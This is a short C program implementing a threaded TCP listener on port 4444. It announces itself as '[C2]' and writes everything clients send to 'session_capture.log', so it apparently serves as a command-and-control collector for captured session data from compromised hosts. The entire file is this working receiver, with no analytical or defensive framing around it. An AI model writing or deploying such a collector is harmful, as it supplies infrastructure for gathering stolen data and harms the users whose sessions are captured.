#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <time.h>

#define PORT     4444
#define LOG_FILE "session_capture.log"

void *handle_client(void *arg) {
    int client = *(int *)arg;
    free(arg);

    char buf[4096];
    ssize_t n;

    FILE *log = fopen(LOG_FILE, "a");

    while ((n = recv(client, buf, sizeof(buf) - 1, 0)) > 0) {
        buf[n] = '\0';
        printf("%s", buf);          // live print to terminal
        fflush(stdout);
        if (log) {
            fputs(buf, log);         // persist to disk
            fflush(log);
        }
    }

    if (log) fclose(log);
    close(client);
    return NULL;
}

int main(void) {
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family      = AF_INET,
        .sin_addr.s_addr = INADDR_ANY,
        .sin_port        = htons(PORT),
    };

    bind(srv, (struct sockaddr *)&addr, sizeof(addr));
    listen(srv, 10);
    printf("[C2] Listening on port %d — logging to %s\n", PORT, LOG_FILE);

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t len = sizeof(client_addr);
        int *client = malloc(sizeof(int));
        *client = accept(srv, (struct sockaddr *)&client_addr, &len);

        pthread_t tid;
        pthread_create(&tid, NULL, handle_client, client);
        pthread_detach(tid);
    }
}